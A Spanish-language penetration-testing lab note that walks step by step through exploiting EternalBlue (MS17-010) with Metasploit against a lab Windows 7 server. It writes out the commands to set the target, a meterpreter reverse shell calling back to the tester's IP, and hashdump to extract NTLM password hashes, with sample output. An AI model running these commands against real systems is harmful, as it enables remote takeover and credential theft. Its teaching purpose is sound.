# Lab 08.1 - Explotando EternalBlue (El arma de la NSA)

## 🎯 Objetivo
Visualizar mentalmente el flujo de ataque exacto de Metasploit desde cero, utilizando la vulnerabilidad más devastadora del siglo XXI: **EternalBlue (MS17-010)**.

---

## 📜 El Contexto (El Arma Filtrada)
EternalBlue es un Exploit cibernético desarrollado en secreto por la **NSA** (Agencia de Seguridad Nacional de EE.UU.). Se aprovecha de un error catastrófico en el protocolo **SMBv1** (Protocolo de carpetas y archivos compartidos de Windows, Puerto 445).
Permite a cualquier atacante, sin tener ninguna contraseña, tomar control total y absoluto (`SYSTEM`) de cualquier máquina Windows antigua conectada a la red (Windows 7, Windows Server 2008), con solo enviarle un paquete de red corrupto.

En 2017, un grupo de hackers ("Shadow Brokers") robó las armas cibernéticas de la NSA y las publicó en Internet. Semanas después, criminales usaron este misil militar y lo mezclaron con un gusano, creando el infame **Ransomware WannaCry**, que paralizó a los hospitales de Reino Unido y empresas de 150 países en 24 horas, causando miles de millones en pérdidas.

Hoy simularemos cómo disparar este misil con Metasploit.

---

## 🛠️ El Escenario (Prueba de Penetración)

Sos un Pentester. Estás en la red de una empresa.
Hiciste un escaneo con Nmap y descubriste la IP del Servidor de Recursos Humanos: **`10.10.10.40`**.
Viste que tiene el **Puerto TCP 445 abierto** (SMB) y es un Windows 7. 
Sospechás que es vulnerable a EternalBlue.

### Paso 1: Abriendo Metasploit y Buscando el Arma
En tu terminal de Kali Linux, tipeás:
`msfconsole`

Cuando carga la pantalla, buscás el misil en la base de datos:
`msf6 > search eternalblue`

Metasploit te devuelve una lista. Elegís cargar el exploit para Windows:
`msf6 > use exploit/windows/smb/ms17_010_eternalblue`

### Paso 2: Escaneo Ciego (Revisando las opciones)
Le preguntás al misil qué información necesita para disparar:
`msf6 exploit(ms17_010_eternalblue) > show options`

Ves que `RHOSTS` (El blanco) está en blanco. Lo configurás con la IP de RR.HH:
`msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40`

### Paso 3: Cargando la Ojiva Nuclear (Payload Reverse Shell)
No querés una simple terminal. Querés inyectar el control supremo en RAM (Meterpreter) e indicarle que rompa el Firewall volviendo a conectarse hacia *tu* IP (`10.10.10.5`).

Le indicás qué Payload usar (Fijate que el nombre usa el guion bajo `_`):
`msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter_reverse_tcp`

Configurás tu IP (LHOST) para que el Payload sepa a dónde debe regresar el llamado:
`msf6 exploit(...) > set LHOST 10.10.10.5`

### Paso 4: Fuego
Está todo listo.
`msf6 exploit(...) > exploit`

**La Magia de la Consola:**
Verás letras azules saliendo en tu pantalla:
```text
[*] Started reverse TCP handler on 10.10.10.5:4444
[*] Connecting to target for exploitation...
[+] Connection established for exploitation.
[*] Trying exploit with 12 Groom Allocations.
[*] Sending all but last fragment of exploit packet
[*] Sending the last fragment of exploit packet!
[*] Meterpreter session 1 opened (10.10.10.5:4444 -> 10.10.10.40:49215)
```
**¡Éxito!** El servidor te devolvió una conexión, evadiendo el firewall. Tu consola cambia de color y dice:
`meterpreter >`

### Paso 5: Post-Explotación Rápida
Comprobás si el exploit te dio privilegios totales:
`meterpreter > getuid`
`Server username: NT AUTHORITY\SYSTEM` *(Sos el Dios absoluto del servidor).*

Le extraés todos los hashes NTLM (BBDD de contraseñas de los usuarios) para luego hacer "Pass The Hash" o crackearlos offline:
`meterpreter > hashdump`
```text
Administrator:500:aad3b4...:31d6cfe0...:::
JuanRRHH:1001:aad3b4...:98a2fe7...:::
```

Has comprometido el corazón corporativo del departamento en 5 comandos estandarizados gracias a Metasploit. 
*(Imaginá tener que hacer todo esto programando el Buffer Overflow en lenguaje de ensamblador C cada vez... Esa es la enorme ventaja del Framework).*

---

## 📝 Conclusión del Laboratorio

Lo que en 1990 tomaba semanas de programación, hoy con Metasploit se reduce a 5 comandos tácticos: **Buscar, Usar, Setear Blanco (RHOSTS), Setear Regreso (LHOST), Explotar.**
El arma de la NSA (EternalBlue) fue el ejemplo más brutal del poder de un exploit Remoto que requiere "Cero Interacción" del usuario, un riesgo crítico que solo el parcheo estricto por parte del Blue Team puede detener.

**➡️ Siguiente nota:** [[08 - Ejercicios]]
